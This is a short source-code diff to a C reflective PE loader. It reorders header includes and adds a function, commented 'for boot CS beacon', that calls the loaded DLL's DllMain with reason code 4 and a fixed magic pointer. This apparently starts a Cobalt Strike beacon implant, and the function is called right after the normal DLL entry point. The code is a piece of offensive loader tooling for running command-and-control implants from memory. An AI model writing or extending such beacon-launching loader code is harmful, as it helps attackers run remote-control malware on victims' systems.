@@ -1,12 +1,14 @@
 #include "c_types.h"
-#include "windows_t.h"
-#include "msvcrt_t.h"
-#include "ucrtbase_t.h"
-#include "pe_image.h"
-#include "rel_addr.h"
+#include "win_types.h"
+#include "dll_kernel32.h"
+#include "dll_shell32.h"
+#include "dll_msvcrt.h"
+#include "dll_ucrtbase.h"
 #include "lib_string.h"
 #include "lib_memory.h"
+#include "rel_addr.h"
 #include "hash_api.h"
+#include "pe_image.h"
 #include "win_api.h"
 #include "random.h"
 #include "errno.h"
@@ -1875,6 +1877,19 @@ static bool pe_dll_main(DWORD dwReason, bool setExitCode)
     return retval;
 }
 
+// TODO remove it, it for boot CS beacon
+__declspec(noinline)
+static bool pe_dll_main2()
+{
+    PELoader* loader = getPELoaderPointer();
+
+    // call dll main function
+    DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
+    HMODULE   hModule = (HMODULE)(loader->PEImage);
+    bool retval = dllMain(hModule, 4, (LPVOID)0x0000000056A2B5F0);
+    return retval;
+}
+
 static void set_exit_code(uint code)
 {
     PELoader* loader = getPELoaderPointer();
@@ -2003,6 +2018,7 @@ errno LDR_Execute()
             {
                 errno = ERR_LOADER_CALL_DLL_MAIN;
             }
+            pe_dll_main2();
             break;
         }
         // change the running status
